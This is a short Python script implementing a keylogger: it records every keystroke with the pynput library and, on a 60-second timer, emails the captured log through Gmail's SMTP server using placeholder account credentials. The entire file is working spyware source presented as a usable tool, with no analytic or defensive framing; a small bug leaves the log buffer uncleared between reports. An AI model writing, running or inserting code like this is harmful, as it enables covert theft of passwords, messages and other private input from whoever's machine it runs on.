import pynput.keyboard
import subprocess,smtplib
import threading

class Keylogger:
	def __init__(self):
		self.log=""
	def process_key_press(self,key):
		try:
			self.log=self.log+str(key.char)
			
		except AttributeError:	
			if key==key.space:
				self.log=self.log+" "
			else:
				self.log=self.log+" "+str(key)+" "	

	def send_mail(self,email,password,message):
		server=smtplib.SMTP("smtp.gmail.com",587)
		server.starttls()
		server.login(email,password)
		server.sendmail(email,email,message)
		server.quit()

	def report(self):	
		global log
		self.send_mail("Your email ","your password",self.log)
		log=""
		timer=threading.Timer(60,self.report)
		timer.start()

	def start(self):
		keyboard_listner=pynput.keyboard.Listener(on_press=self.process_key_press)
		with keyboard_listner:
			self.report()
			keyboard_listner.join()
			

my_keylogger=Keylogger()
my_keylogger.start()











		

	




